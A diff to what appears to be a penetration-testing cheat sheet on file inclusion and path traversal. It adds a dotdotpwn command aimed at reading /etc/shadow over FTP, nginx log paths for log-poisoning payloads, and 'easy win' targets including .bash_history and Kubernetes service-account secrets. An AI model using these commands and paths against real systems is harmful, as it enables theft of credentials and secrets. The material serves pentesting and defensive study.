@@ -4,8 +4,17 @@
 
 ## Summary
 
+* [Tools](#tools)
 * [Basic exploitation](#basic-exploitation)
 * [Path Traversal](#path-traversal)
+
+## Tools
+
+- [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
+    ```powershell
+    git clone https://github.com/wireghoul/dotdotpwn
+    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
+    ```
 
 ## Basic exploitation
 
@@ -111,6 +120,8 @@ The following log files are controllable and can be included with an evil payloa
 /var/log/httpd/error_log
 /usr/local/apache/log/error_log
 /usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
 /var/log/vsftpd.log
 /var/log/sshd.log
 /var/log/mail
@@ -119,6 +130,7 @@ The following log files are controllable and can be included with an evil payloa
 Other easy win files.
 
 ```powershell
+/proc/self/cwd/index.php
 /home/$USER/.bash_history
 /var/run/secrets/kubernetes.io/serviceaccount
 ```
